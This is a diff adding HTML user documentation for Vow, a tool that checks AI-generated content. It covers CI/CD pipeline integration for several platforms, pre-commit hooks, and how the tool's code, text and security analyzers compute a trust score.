+      - name: Check AI-generated content (JSON output)
+        run: |
+          vow check . --format json --quiet --max-file-size 5 --max-issues 50 --output results.json
+          
+      - name: Process results
+        run: |
+          ISSUES=$(jq '.summary.total_issues' results.json)
+          PERFORMANCE=$(jq '.performance.files_per_second' results.json)
+          echo "Found $ISSUES issues"
+          echo "Performance: $PERFORMANCE files/sec"
+          if [ "$ISSUES" -gt 0 ]; then
+            echo "❌ AI content verification failed"
+            jq '.files[] | select(.issues | length &gt; 0)' results.json
+            exit 1
+          else
+            echo "✅ All AI content verified successfully"
+          fi
+          
+      - name: Upload SARIF results (optional)
+        if: failure()
+        run: |
+          vow check . --format sarif --output vow-results.sarif
+        continue-on-error: true
+        
+      - name: Upload SARIF
+        if: failure()
+        uses: github/codeql-action/upload-sarif@v3
+        with:
+          sarif_file: vow-results.sarif
+</code></pre>
+<h2 id="whats-next"><a class="header" href="#whats-next">What's Next?</a></h2>
+<p>Now that you have Vow up and running, explore these areas:</p>
+<ul>
+<li><strong><a href="getting-started/../guide/checking-files.html">Checking Files</a></strong>: Learn advanced file checking techniques</li>
+<li><strong><a href="getting-started/../configuration/config-file.html">Configuration</a></strong>: Customize Vow for your projects</li>
+<li><strong><a href="getting-started/../analyzers/overview.html">Analyzers</a></strong>: Deep dive into how each analyzer works</li>
+<li><strong><a href="getting-started/../rules/writing-rules.html">Rules</a></strong>: Write custom rules for your domain</li>
+<li><strong><a href="getting-started/../guide/ci-cd-integration.html">CI/CD Integration</a></strong>: Set up automated checks</li>
+</ul>
+<h2 id="getting-help"><a class="header" href="#getting-help">Getting Help</a></h2>
+<ul>
+<li>View built-in help: <code>vow --help</code> or <code>vow check --help</code></li>
+<li>Check configuration: <code>vow config show</code></li>
+<li>List available analyzers: <code>vow analyzers list</code></li>
+<li>Test rule syntax: <code>vow rules validate my_rules.yaml</code></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="checking-files"><a class="header" href="#checking-files">Checking Files</a></h1>
+<p>Learn advanced techniques for analyzing individual files with Vow.</p>
+<h2 id="single-file-analysis"><a class="header" href="#single-file-analysis">Single File Analysis</a></h2>
+<pre><code class="language-bash"># Basic file check
+vow check script.py
+
+# With specific analyzers
+vow check script.py --analyzers code,security
+
+# Verbose output with explanations
+vow check script.py --verbose
+</code></pre>
+<h2 id="file-type-detection"><a class="header" href="#file-type-detection">File Type Detection</a></h2>
+<p>Vow automatically detects file types and applies appropriate analyzers:</p>
+<ul>
+<li><strong>Python files</strong> (<code>.py</code>) → Code + Security analyzers</li>
+<li><strong>JavaScript files</strong> (<code>.js</code>, <code>.ts</code>) → Code + Security analyzers</li>
+<li><strong>Markdown files</strong> (<code>.md</code>) → Text analyzer</li>
+<li><strong>Configuration files</strong> (<code>.yaml</code>, <code>.json</code>) → Security analyzer</li>
+</ul>
+<h2 id="advanced-options"><a class="header" href="#advanced-options">Advanced Options</a></h2>
+<p>See <a href="guide/../reference/cli-reference.html">CLI Reference</a> for complete options.</p>
+<p><em>This page is under development. See <a href="guide/../getting-started/quick-start.html">Quick Start</a> for current examples.</em></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="checking-directories"><a class="header" href="#checking-directories">Checking Directories</a></h1>
+<p>Learn how to analyze entire directories and projects with Vow.</p>
+<h2 id="directory-analysis"><a class="header" href="#directory-analysis">Directory Analysis</a></h2>
+<pre><code class="language-bash"># Check all files in current directory
+vow check .
+
+# Check specific directory
+vow check src/
+
+# Include/exclude patterns
+vow check . --include "*.py" --exclude "test_*"
+</code></pre>
+<h2 id="performance-tips"><a class="header" href="#performance-tips">Performance Tips</a></h2>
+<ul>
+<li>Use <code>--jobs N</code> for parallel processing</li>
+<li>Cache results with <code>--cache</code></li>
+<li>Set file size limits with <code>--max-file-size</code></li>
+</ul>
+<p><em>This page is under development. See <a href="guide/ci-cd-integration.html">CI/CD Integration</a> for advanced examples.</em></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="cicd-integration-1"><a class="header" href="#cicd-integration-1">CI/CD Integration</a></h1>
+<p>Integrating Vow into your CI/CD pipeline helps catch AI output issues before they reach production. This guide covers setup for major CI platforms and best practices for automated verification.</p>
+<h2 id="github-actions"><a class="header" href="#github-actions">GitHub Actions</a></h2>
+<h3 id="basic-setup"><a class="header" href="#basic-setup">Basic Setup</a></h3>
+<p>Create <code>.github/workflows/vow-check.yml</code>:</p>
+<pre><code class="language-yaml">name: AI Output Verification
+on:
+  push:
+    branches: [ main, develop ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  vow-check:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+        
+      - name: Install Vow
+        run: |
+          curl -L https://github.com/guanchuan1314/vow/releases/latest/download/vow-linux-x86_64 -o vow
+          chmod +x vow
+          sudo mv vow /usr/local/bin/
+          
+      - name: Setup Vow models
+        run: vow setup --models code,security
+        
+      - name: Check AI-generated content
+        run: |
+          # JSON format recommended for CI/CD performance
+          vow check . --format json --quiet --max-file-size 5 --output vow-results.json
+          # Also generate SARIF for GitHub Security tab
+          vow check . --format sarif --output vow-results.sarif
+        
+      - name: Upload SARIF results
+        uses: github/codeql-action/upload-sarif@v3
+        if: always()
+        with:
+          sarif_file: vow-results.sarif
+</code></pre>
+<h3 id="advanced-configuration"><a class="header" href="#advanced-configuration">Advanced Configuration</a></h3>
+<pre><code class="language-yaml">name: Comprehensive AI Verification
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  vow-check:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        check-type: [code, docs, security]
+        
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0  # For changed files detection
+          
+      - name: Get changed files
+        id: changed-files
+        uses: tj-actions/changed-files@v40
+        with:
+          files: |
+            **/*.py
+            **/*.js
+            **/*.ts
+            **/*.md
+            **/*.rst
+            
+      - name: Install Vow
+        if: steps.changed-files.outputs.any_changed == 'true'
+        run: |
+          # Use cached binary if available
+          curl -L https://github.com/guanchuan1314/vow/releases/latest/download/vow-linux-x86_64 -o vow
+          chmod +x vow
+          sudo mv vow /usr/local/bin/
+          
+      - name: Cache Vow models
+        if: steps.changed-files.outputs.any_changed == 'true'
+        uses: actions/cache@v3
+        with:
+          path: ~/.local/share/vow/models
+          key: vow-models-${{ runner.os }}-${{ hashFiles('**/vow-version') }}
+          restore-keys: vow-models-${{ runner.os }}-
+          
+      - name: Setup Vow
+        if: steps.changed-files.outputs.any_changed == 'true'
+        run: vow setup --models ${{ matrix.check-type }}
+        
+      - name: Check changed files
+        if: steps.changed-files.outputs.any_changed == 'true'
+        run: |
+          echo "${{ steps.changed-files.outputs.all_changed_files }}" | \
+          xargs vow check --analyzers ${{ matrix.check-type }} \
+            --format sarif \
+            --output vow-${{ matrix.check-type }}-results.sarif \
+            --min-trust-score 0.7
+            
+      - name: Upload SARIF
+        if: always() &amp;&amp; steps.changed-files.outputs.any_changed == 'true'
+        uses: github/codeql-action/upload-sarif@v3
+        with:
+          sarif_file: vow-${{ matrix.check-type }}-results.sarif
+          category: vow-${{ matrix.check-type }}
+</code></pre>
+<h3 id="pull-request-comments"><a class="header" href="#pull-request-comments">Pull Request Comments</a></h3>
+<p>Add PR comments with Vow results:</p>
+<pre><code class="language-yaml">      - name: Run Vow check
+        id: vow-check
+        run: |
+          vow check . --format json --output vow-results.json
+          echo "results_file=vow-results.json" &gt;&gt; $GITHUB_OUTPUT
+        continue-on-error: true
+        
+      - name: Comment PR
+        if: github.event_name == 'pull_request'
+        uses: actions/github-script@v6
+        with:
+          script: |
+            const fs = require('fs');
+            const results = JSON.parse(fs.readFileSync('${{ steps.vow-check.outputs.results_file }}', 'utf8'));
+            
+            const summary = results.summary;
+            const issues = results.files.flatMap(f =&gt; f.issues || []);
+            
+            let comment = `## 🤖 AI Output Verification Results\n\n`;
+            comment += `**Trust Score**: ${summary.trust_score_avg.toFixed(2)}/1.0\n`;
+            comment += `**Files Checked**: ${summary.total_files}\n`;
+            comment += `**Issues Found**: ${issues.length}\n\n`;
+            
+            if (issues.length &gt; 0) {
+              comment += `### Issues Found\n\n`;
+              issues.slice(0, 10).forEach(issue =&gt; {
+                comment += `- **${issue.severity.toUpperCase()}**: ${issue.message} (${issue.rule})\n`;
+              });
+              
+              if (issues.length &gt; 10) {
+                comment += `\n... and ${issues.length - 10} more issues.\n`;
+              }
+            } else {
+              comment += `✅ No issues found! Good job on the AI output quality.\n`;
+            }
+            
+            github.rest.issues.createComment({
+              issue_number: context.issue.number,
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              body: comment
+            });
+</code></pre>
+<h2 id="gitlab-ci"><a class="header" href="#gitlab-ci">GitLab CI</a></h2>
+<h3 id="basic-pipeline"><a class="header" href="#basic-pipeline">Basic Pipeline</a></h3>
+<p><code>.gitlab-ci.yml</code>:</p>
+<pre><code class="language-yaml">stages:
+  - test
+  - security
+
+variables:
+  VOW_VERSION: "latest"
+
+vow-check:
+  stage: test
+  image: ubuntu:22.04
+  
+  before_script:
+    - apt-get update &amp;&amp; apt-get install -y curl
+    - curl -L "https://github.com/guanchuan1314/vow/releases/latest/download/vow-linux-x86_64" -o vow
+    - chmod +x vow &amp;&amp; mv vow /usr/local/bin/
+    - vow setup --models code,text
+    
+  script:
+    - vow check . --format json --output vow-results.json
+    
+  artifacts:
+    reports:
+      # GitLab will display SARIF results in security dashboard
+      sast: vow-sarif-results.sarif
+    paths:
+      - vow-results.json
+    expire_in: 1 week
+    
+  rules:
+    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+</code></pre>
+<h3 id="advanced-gitlab-setup"><a class="header" href="#advanced-gitlab-setup">Advanced GitLab Setup</a></h3>
+<pre><code class="language-yaml"># Include template for better SARIF support
+include:
+  - template: Security/SAST.gitlab-ci.yml
+
+vow-security-scan:
+  stage: test
+  image: ubuntu:22.04
+  
+  variables:
+    TRUST_SCORE_THRESHOLD: "0.7"
+    
+  script:
+    - |
+      # Install Vow
+      curl -L "https://github.com/guanchuan1314/vow/releases/latest/download/vow-linux-x86_64" -o vow
+      chmod +x vow &amp;&amp; mv vow /usr/local/bin/
+      
+      # Setup with caching
+      vow setup --models all
+      
+      # Check only changed files in MRs
+      if [ "$CI_PIPELINE_SOURCE" = "merge_request_event" ]; then
+        git diff --name-only $CI_MERGE_REQUEST_TARGET_BRANCH_SHA..$CI_COMMIT_SHA | \
+        grep -E '\.(py|js|ts|md)$' | \
+        xargs -r vow check --min-trust-score $TRUST_SCORE_THRESHOLD
+      else
+        vow check . --min-trust-score $TRUST_SCORE_THRESHOLD
+      fi
+      
+  artifacts:
+    reports:
+      sast: vow-results.sarif
+</code></pre>
+<h2 id="jenkins"><a class="header" href="#jenkins">Jenkins</a></h2>
+<h3 id="declarative-pipeline"><a class="header" href="#declarative-pipeline">Declarative Pipeline</a></h3>
+<p><code>Jenkinsfile</code>:</p>
+<pre><code class="language-groovy">pipeline {
+    agent any
+    
+    environment {
+        VOW_CACHE = "${WORKSPACE}/.vow-cache"
+    }
+    
+    stages {
+        stage('Setup') {
+            steps {
+                script {
+                    // Download and cache Vow binary
+                    sh '''
+                        if [ ! -f vow ]; then
+                            curl -L https://github.com/guanchuan1314/vow/releases/latest/download/vow-linux-x86_64 -o vow
+                            chmod +x vow
+                        fi
+                        ./vow --version
+                    '''
+                }
+            }
+        }
+        
+        stage('Model Setup') {
+            steps {
+                // Cache models between runs
+                cache(maxCacheSize: 500, caches: [
+                    arbitraryFileCache(path: '.vow-models', fingerprinting: true)
+                ]) {
+                    sh './vow setup --models code,security'
+                }
+            }
+        }
+        
+        stage('AI Output Check') {
+            parallel {
+                stage('Code Analysis') {
+                    steps {
+                        sh '''
+                            ./vow check . --analyzers code \
+                              --format json --output vow-code-results.json \
+                              --min-trust-score 0.6
+                        '''
+                    }
+                }
+                
+                stage('Security Analysis') {
+                    steps {
+                        sh '''
+                            ./vow check . --analyzers security \
+                              --format sarif --output vow-security-results.sarif \
+                              --min-trust-score 0.8
+                        '''
+                    }
+                }
+            }
+        }
+        
+        stage('Process Results') {
+            steps {
+                // Archive results
+                archiveArtifacts artifacts: 'vow-*.json,vow-*.sarif'
+                
+                // Publish SARIF results (requires SARIF plugin)
+                publishSarif sarifFiles: 'vow-security-results.sarif'
+                
+                // Create summary
+                script {
+                    def results = readJSON file: 'vow-code-results.json'
+                    def summary = results.summary
+                    
+                    echo "Trust Score: ${summary.trust_score_avg}"
+                    echo "Files with issues: ${summary.files_with_issues}/${summary.total_files}"
+                    
+                    // Fail build if trust score too low
+                    if (summary.trust_score_avg &lt; 0.5) {
+                        error("Trust score ${summary.trust_score_avg} below minimum threshold 0.5")
+                    }
+                }
+            }
+        }
+    }
+    
+    post {
+        always {
+            // Clean up
+            sh 'rm -f vow'
+        }
+        
+        failure {
+            emailext (
+                subject: "Vow Check Failed: ${env.JOB_NAME} - ${env.BUILD_NUMBER}",
+                body: "AI output verification failed. Check the build logs for details.",
+                to: "${env.CHANGE_AUTHOR_EMAIL}"
+            )
+        }
+    }
+}
+</code></pre>
+<h2 id="azure-devops"><a class="header" href="#azure-devops">Azure DevOps</a></h2>
+<h3 id="azure-pipelines-yaml"><a class="header" href="#azure-pipelines-yaml">Azure Pipelines YAML</a></h3>
+<p><code>azure-pipelines.yml</code>:</p>
+<pre><code class="language-yaml">trigger:
+  branches:
+    include:
+      - main
+      - develop
+
+pr:
+  branches:
+    include:
+      - main
+
+pool:
+  vmImage: 'ubuntu-latest'
+
+variables:
+  vowVersion: 'latest'
+  trustScoreThreshold: 0.7
+
+stages:
+- stage: AIVerification
+  displayName: 'AI Output Verification'
+  jobs:
+  - job: VowCheck
+    displayName: 'Run Vow Analysis'
+    
+    steps:
+    - checkout: self
+      fetchDepth: 0
+      
+    - task: Cache@2
+      inputs:
+        key: 'vow-models | "$(Agent.OS)" | "$(vowVersion)"'
+        path: $(Pipeline.Workspace)/.vow-models
+        cacheHitVar: MODELS_CACHE_RESTORED
+        
+    - bash: |
+        curl -L https://github.com/guanchuan1314/vow/releases/latest/download/vow-linux-x86_64 -o vow
+        chmod +x vow
+        sudo mv vow /usr/local/bin/
+      displayName: 'Install Vow'
+      
+    - bash: |
+        vow setup --models all
+      displayName: 'Setup Vow Models'
+      condition: ne(variables.MODELS_CACHE_RESTORED, 'true')
+      
+    - bash: |
+        # Check changed files only for PRs
+        if [ "$(Build.Reason)" = "PullRequest" ]; then
+          git diff --name-only HEAD~1 | grep -E '\.(py|js|ts|md)$' | xargs -r vow check
+        else
+          vow check .
+        fi
+        
+        vow check . --format sarif --output $(Agent.TempDirectory)/vow-results.sarif
+      displayName: 'Run Vow Analysis'
+      
+    - task: PublishTestResults@2
+      condition: always()
+      inputs:
+        testResultsFormat: 'SARIF'
+        testResultsFiles: '$(Agent.TempDirectory)/vow-results.sarif'
+        mergeTestResults: true
+        
+    - bash: |
+        # Generate summary for PR comment
+        vow check . --format json --output vow-summary.json
+        
+        TRUST_SCORE=$(jq -r '.summary.trust_score_avg' vow-summary.json)
+        ISSUES_COUNT=$(jq -r '.summary.files_with_issues' vow-summary.json)
+        
+        echo "##vso[task.setvariable variable=TrustScore]$TRUST_SCORE"
+        echo "##vso[task.setvariable variable=IssuesCount]$ISSUES_COUNT"
+        
+        # Fail if below threshold
+        if (( $(echo "$TRUST_SCORE &lt; $(trustScoreThreshold)" | bc -l) )); then
+          echo "##vso[task.logissue type=error]Trust score $TRUST_SCORE below threshold $(trustScoreThreshold)"
+          exit 1
+        fi
+      displayName: 'Process Results'
+</code></pre>
+<h2 id="docker-integration"><a class="header" href="#docker-integration">Docker Integration</a></h2>
+<h3 id="dockerfile-for-ci"><a class="header" href="#dockerfile-for-ci">Dockerfile for CI</a></h3>
+<pre><code class="language-dockerfile"># Multi-stage build for CI
+FROM ubuntu:22.04 as vow-installer
+RUN apt-get update &amp;&amp; apt-get install -y curl
+RUN curl -L https://github.com/guanchuan1314/vow/releases/latest/download/vow-linux-x86_64 -o /usr/local/bin/vow
+RUN chmod +x /usr/local/bin/vow
+
+FROM ubuntu:22.04
+COPY --from=vow-installer /usr/local/bin/vow /usr/local/bin/vow
+
+# Pre-download models
+RUN vow setup --models all
+
+# Set up entrypoint
+COPY entrypoint.sh /entrypoint.sh
+RUN chmod +x /entrypoint.sh
+ENTRYPOINT ["/entrypoint.sh"]
+</code></pre>
+<h3 id="docker-compose-for-local-testing"><a class="header" href="#docker-compose-for-local-testing">Docker Compose for Local Testing</a></h3>
+<pre><code class="language-yaml"># docker-compose.ci.yml
+version: '3.8'
+
+services:
+  vow-check:
+    build: 
+      context: .
+      dockerfile: Dockerfile.vow
+    volumes:
+      - .:/workspace
+    working_dir: /workspace
+    command: vow check . --format json --output /workspace/results.json
+    
+  vow-server:
+    image: ghcr.io/guanchuan1314/vow:latest
+    ports:
+      - "8080:8080"
+    command: vow daemon --port 8080 --bind 0.0.0.0
+    volumes:
+      - vow-models:/app/models
+      
+volumes:
+  vow-models:
+</code></pre>
+<h2 id="pre-commit-integration"><a class="header" href="#pre-commit-integration">Pre-commit Integration</a></h2>
+<h3 id="pre-commit-hook"><a class="header" href="#pre-commit-hook">Pre-commit Hook</a></h3>
+<p><code>.pre-commit-config.yaml</code>:</p>
+<pre><code class="language-yaml">repos:
+  - repo: local
+    hooks:
+      - id: vow-check
+        name: AI Output Verification
+        entry: vow
+        args: [check, --min-trust-score, "0.6", --format, table]
+        language: system
+        files: \.(py|js|ts|md)$
+        pass_filenames: true
+</code></pre>
+<h3 id="git-hook-script"><a class="header" href="#git-hook-script">Git Hook Script</a></h3>
+<p><code>.git/hooks/pre-commit</code>:</p>
+<pre><code class="language-bash">#!/bin/sh
+# AI output verification pre-commit hook
+
+# Check if vow is installed
+if ! command -v vow &amp;&gt; /dev/null; then
+    echo "Warning: Vow not installed, skipping AI verification"
+    exit 0
+fi
+
+# Get staged files
+staged_files=$(git diff --cached --name-only --diff-filter=ACM | grep -E '\.(py|js|ts|md)$')
+
+if [ -z "$staged_files" ]; then
+    echo "No relevant files to check"
+    exit 0
+fi
+
+echo "Running AI output verification on staged files..."
+
+# Run vow on staged files
+echo "$staged_files" | xargs vow check --min-trust-score 0.5 --format table
+
+result=$?
+
+if [ $result -ne 0 ]; then
+    echo ""
+    echo "❌ AI output verification failed!"
+    echo "Fix the issues above or use 'git commit --no-verify' to skip verification"
+    exit 1
+fi
+
+echo "✅ AI output verification passed"
+exit 0
+</code></pre>
+<h2 id="best-practices"><a class="header" href="#best-practices">Best Practices</a></h2>
+<h3 id="1-gradual-adoption"><a class="header" href="#1-gradual-adoption">1. Gradual Adoption</a></h3>
+<p>Start with warnings, gradually enforce:</p>
+<pre><code class="language-yaml"># Week 1: Just collect data
+- vow check . --format json --output results.json || true
+
+# Week 2: Warn on low scores  
+- vow check . --min-trust-score 0.3 --format table || true
+
+# Week 3: Fail on very low scores
+- vow check . --min-trust-score 0.5
+
+# Week 4: Raise the bar
+- vow check . --min-trust-score 0.7
+</code></pre>
+<h3 id="2-different-standards-by-file-type"><a class="header" href="#2-different-standards-by-file-type">2. Different Standards by File Type</a></h3>
+<pre><code class="language-yaml">script:
+  # Strict for production code
+  - vow check src/ --min-trust-score 0.8 --analyzers code,security
+  
+  # Medium for documentation
+  - vow check docs/ --min-trust-score 0.6 --analyzers text
+  
+  # Lenient for tests/examples
+  - vow check test/ examples/ --min-trust-score 0.4 || true
+</code></pre>
+<h3 id="3-performance-optimization"><a class="header" href="#3-performance-optimization">3. Performance Optimization</a></h3>
+<pre><code class="language-yaml"># Cache models between runs
+- uses: actions/cache@v3
+  with:
+    path: ~/.local/share/vow/models
+    key: vow-models-${{ hashFiles('vow-version') }}
+
+# Only check changed files in PRs
+- name: Get changed files
+  if: github.event_name == 'pull_request'
+  run: |
+    git diff --name-only ${{ github.event.pull_request.base.sha }}..${{ github.sha }} &gt; changed_files.txt
+    
+- name: Check changed files only
+  if: github.event_name == 'pull_request'
+  run: |
+    cat changed_files.txt | grep -E '\.(py|js|ts)$' | xargs -r vow check
+</code></pre>
+<h3 id="4-results-integration"><a class="header" href="#4-results-integration">4. Results Integration</a></h3>
+<pre><code class="language-yaml"># Multiple output formats for different consumers
+- vow check . --format sarif --output security-results.sarif  # For GitHub Security
+- vow check . --format json --output ci-results.json         # For processing
+- vow check . --format html --output report.html             # For humans
+</code></pre>
+<h2 id="troubleshooting-1"><a class="header" href="#troubleshooting-1">Troubleshooting</a></h2>
+<h3 id="common-issues"><a class="header" href="#common-issues">Common Issues</a></h3>
+<p><strong>Model download timeouts:</strong></p>
+<pre><code class="language-yaml">- name: Setup with retry
+  run: |
+    for i in {1..3}; do
+      if vow setup --models code,security; then
+        break
+      fi
+      echo "Attempt $i failed, retrying..."
+      sleep 10
+    done
+</code></pre>
+<p><strong>Large repository performance:</strong></p>
+<pre><code class="language-yaml"># Use parallel processing, new performance options, and .vowignore
+- name: Fast check for large repos
+  run: |
+    # Create .vowignore for performance
+    echo "node_modules/
+    .venv/
+    build/
+    dist/" &gt; .vowignore
+    
+    # Use new performance flags (35+ files/sec throughput)
+    vow check . --quiet --verbose \
+      --max-file-size 10 \
+      --max-depth 5 \
+      --max-issues 50 \
+      --format json
+</code></pre>
+<p><strong>False positives in generated code:</strong></p>
+<pre><code class="language-yaml"># Skip auto-generated files
+- name: Check only human-written code
+  run: |
+    vow check . \
+      --exclude "**/generated/**" \
+      --exclude "**/*.pb.py" \
+      --exclude "**/*_pb2.py"
+</code></pre>
+<h2 id="next-steps-1"><a class="header" href="#next-steps-1">Next Steps</a></h2>
+<ul>
+<li><a href="guide/../configuration/config-file.html">Configuration File</a> - Customize Vow behavior for CI</li>
+<li><a href="guide/../reference/output-formats.html">Output Formats</a> - Understanding CI-friendly formats</li>
+<li><a href="guide/../reference/trust-score.html">Trust Score</a> - Setting appropriate thresholds</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="stdin-and-pipes"><a class="header" href="#stdin-and-pipes">Stdin and Pipes</a></h1>
+<p>Use Vow with pipes and stdin for flexible integration with other tools.</p>
+<h2 id="basic-stdin-usage"><a class="header" href="#basic-stdin-usage">Basic Stdin Usage</a></h2>
+<pre><code class="language-bash"># Check code from clipboard
+pbpaste | vow check --stdin
+
+# Check git diff before committing
+git diff --cached | vow check --stdin --format table
+
+# Pipe from other commands
+cat script.py | vow check --stdin --analyzers code
+</code></pre>
+<h2 id="integration-examples"><a class="header" href="#integration-examples">Integration Examples</a></h2>
+<pre><code class="language-bash"># Check only changed files in git
+git diff --name-only --cached | xargs vow check
+
+# Process multiple files
+find . -name "*.py" | xargs vow check --format json
+</code></pre>
+<p><em>This page is under development. See <a href="guide/../reference/cli-reference.html">CLI Reference</a> for complete stdin options.</em></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="analyzers-overview"><a class="header" href="#analyzers-overview">Analyzers Overview</a></h1>
+<p>Vow uses a multi-analyzer architecture to detect different types of issues in AI-generated content. Each analyzer specializes in a particular domain and contributes to the overall trust score.</p>
+<h2 id="available-analyzers"><a class="header" href="#available-analyzers">Available Analyzers</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>Analyzer</th><th>Purpose</th><th>Languages</th><th>Model Size</th></tr></thead><tbody>
+<tr><td><a href="analyzers/code-analyzer.html">Code</a></td><td>Detects hallucinated APIs, imports, and syntax issues</td><td>Python, JavaScript, TypeScript, Go, Rust</td><td>~50MB</td></tr>
+<tr><td><a href="analyzers/text-analyzer.html">Text</a></td><td>Identifies fabricated facts, inconsistencies, and style issues</td><td>Any text content</td><td>~75MB</td></tr>
+<tr><td><a href="analyzers/hallucination-detection.html">Security</a></td><td>Finds security vulnerabilities and dangerous patterns</td><td>All</td><td>~25MB</td></tr>
+</tbody></table>
+</div>
+<h2 id="how-analyzers-work"><a class="header" href="#how-analyzers-work">How Analyzers Work</a></h2>
+<h3 id="1-content-detection"><a class="header" href="#1-content-detection">1. Content Detection</a></h3>
+<p>First, Vow identifies sections that are likely AI-generated using:</p>
+<ul>
+<li>Entropy analysis (detecting unnatural patterns)</li>
+<li>Style consistency checks</li>
+<li>Common AI output markers</li>
+<li>User annotations (<code>&lt;!-- AI-generated --&gt;</code>)</li>
+</ul>
+<h3 id="2-analyzer-pipeline"><a class="header" href="#2-analyzer-pipeline">2. Analyzer Pipeline</a></h3>
+<p>Each enabled analyzer processes the content independently:</p>
+<pre><code class="language-mermaid">graph LR
+    A[Input] --&gt; B[Code Analyzer]
+    A --&gt; C[Text Analyzer] 
+    A --&gt; D[Security Analyzer]
+    B --&gt; E[Rule Engine]
+    C --&gt; E
+    D --&gt; E
+    E --&gt; F[Trust Score]
+    F --&gt; G[Output]
+</code></pre>
+<h3 id="3-issue-detection"><a class="header" href="#3-issue-detection">3. Issue Detection</a></h3>
+<p>Analyzers look for specific issue patterns:</p>
+<pre><code class="language-yaml"># Example issue types
+code_issues:
+  - hallucinated_imports    # Non-existent packages
+  - invalid_apis           # Fabricated endpoints  
+  - syntax_errors          # Malformed code
+  - deprecated_usage       # Outdated APIs
+
+text_issues:
+  - factual_errors         # Contradicts known facts
+  - broken_references      # Invalid URLs/citations
+  - inconsistencies        # Self-contradictory content
+  - style_anomalies        # Unnatural writing patterns
+
+security_issues:
+  - hardcoded_secrets      # API keys, passwords
+  - injection_patterns     # SQL injection, XSS
+  - dangerous_functions    # eval(), exec(), etc.
+  - privilege_escalation   # Unsafe permissions
+</code></pre>
+<h2 id="analyzer-selection"><a class="header" href="#analyzer-selection">Analyzer Selection</a></h2>
+<h3 id="automatic-selection"><a class="header" href="#automatic-selection">Automatic Selection</a></h3>
+<p>By default, Vow automatically selects analyzers based on file type:</p>
+<pre><code class="language-bash"># Python files → Code + Security analyzers
+vow check script.py
+
+# Markdown files → Text + Security analyzers  
+vow check document.md
+
+# Mixed directory → All analyzers
+vow check ./project
+</code></pre>
+<h3 id="manual-selection"><a class="header" href="#manual-selection">Manual Selection</a></h3>
+<p>Override automatic selection with <code>--analyzers</code>:</p>
+<pre><code class="language-bash"># Use only code analyzer
+vow check file.py --analyzers code
+
+# Use multiple specific analyzers
+vow check . --analyzers code,security
+
+# Exclude text analyzer
+vow check . --exclude-analyzers text
+</code></pre>
+<h3 id="configuration-file-1"><a class="header" href="#configuration-file-1">Configuration File</a></h3>
+<p>Set default analyzers in <code>.vow.yaml</code>:</p>
+<pre><code class="language-yaml">analyzers:
+  # Enabled analyzers (default: auto)
+  enabled:
+    - code
+    - text
+    - security
+  
+  # Auto-selection rules
+  auto_select:
+    "*.py": [code, security]
+    "*.js": [code, security]
+    "*.md": [text]
+    "*.rst": [text]
+    "*": [code, text, security]
+</code></pre>
+<h2 id="performance-considerations"><a class="header" href="#performance-considerations">Performance Considerations</a></h2>
+<h3 id="model-loading"><a class="header" href="#model-loading">Model Loading</a></h3>
+<ul>
+<li>Models are loaded once and cached in memory</li>
+<li>First run may be slower (~2-3 seconds)</li>
+<li>Subsequent runs are faster (~100-500ms per file)</li>
+</ul>
+<h3 id="resource-usage"><a class="header" href="#resource-usage">Resource Usage</a></h3>
+<div class="table-wrapper"><table><thead><tr><th>Analyzer</th><th>RAM Usage</th><th>CPU Usage</th><th>Disk I/O</th></tr></thead><tbody>
+<tr><td>Code</td><td>~200MB</td><td>Medium</td><td>Low</td></tr>
+<tr><td>Text</td><td>~300MB</td><td>High</td><td>Low</td></tr>
+<tr><td>Security</td><td>~100MB</td><td>Low</td><td>Low</td></tr>
+</tbody></table>
+</div>
+<h3 id="optimization-tips"><a class="header" href="#optimization-tips">Optimization Tips</a></h3>
+<pre><code class="language-bash"># Skip model loading for syntax-only checks
+vow check file.py --no-ml-models
+
+# Use faster, less accurate models
+vow check . --model-size small
+
+# Parallel processing for large directories
+vow check . --jobs 4
+
+# Cache results for unchanged files
+vow check . --cache
+</code></pre>
+<h2 id="trust-score-calculation"><a class="header" href="#trust-score-calculation">Trust Score Calculation</a></h2>
+<p>Each analyzer contributes to the overall trust score:</p>
+<pre><code>Trust Score = weighted_average(analyzer_scores)
+
+Where:
+- Code Analyzer Weight: 40%
+- Text Analyzer Weight: 35%
+- Security Analyzer Weight: 25%
+</code></pre>
+<h3 id="score-interpretation"><a class="header" href="#score-interpretation">Score Interpretation</a></h3>
+<ul>
+<li><strong>0.8-1.0</strong>: High confidence (green)</li>
+<li><strong>0.6-0.8</strong>: Medium confidence (yellow)</li>
+<li><strong>0.3-0.6</strong>: Low confidence (orange)</li>
+<li><strong>0.0-0.3</strong>: Very low confidence (red)</li>
+</ul>
+<h2 id="custom-analyzers"><a class="header" href="#custom-analyzers">Custom Analyzers</a></h2>
+<p>Vow supports custom analyzers via WASM plugins:</p>
+<pre><code class="language-bash"># Install a custom analyzer
+vow analyzers install my-analyzer.wasm
+
+# List installed analyzers
+vow analyzers list
+
+# Use custom analyzer
+vow check file.py --analyzers my-analyzer
+</code></pre>
+<p>See <a href="analyzers/../advanced/custom-analyzers.html">Writing Custom Analyzers</a> for details.</p>
+<h2 id="debugging-analyzers"><a class="header" href="#debugging-analyzers">Debugging Analyzers</a></h2>
+<h3 id="verbose-output"><a class="header" href="#verbose-output">Verbose Output</a></h3>
+<pre><code class="language-bash"># Show analyzer decisions
+vow check file.py --verbose
+
+# Debug specific analyzer
+vow check file.py --debug-analyzer code
+</code></pre>
+<h3 id="analyzer-logs"><a class="header" href="#analyzer-logs">Analyzer Logs</a></h3>
+<pre><code class="language-bash"># Show performance metrics
+vow check . --stats
+
+# Export detailed logs
+vow check . --log-file vow.log --log-level debug
+</code></pre>
